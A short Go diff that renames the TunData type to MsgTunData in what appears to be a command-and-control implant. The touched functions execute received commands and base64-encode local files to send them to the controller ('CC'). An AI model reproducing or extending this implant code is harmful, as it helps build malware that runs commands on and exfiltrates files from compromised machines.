@@ -23,9 +23,9 @@ import (
 )
 
 // exec cmd, receive data, etc
-func processCCData(data *TunData) {
+func processCCData(data *MsgTunData) {
 	var (
-		data2send   TunData
+		data2send   MsgTunData
 		out         string
 		outCombined []byte
 		err         error
@@ -175,7 +175,7 @@ func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
 }
 
 // Send2CC send TunData to CC
-func Send2CC(data *TunData) error {
+func Send2CC(data *MsgTunData) error {
 	var out = json.NewEncoder(H2Json)
 
 	err := out.Encode(data)
@@ -353,7 +353,7 @@ func file2CC(filepath string) (checksum string, err error) {
 	// base64 encode
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
-	fileData := TunData{
+	fileData := MsgTunData{
 		Payload: "FILE" + OpSep + filepath + OpSep + payload,
 		Tag:     Tag,
 	}
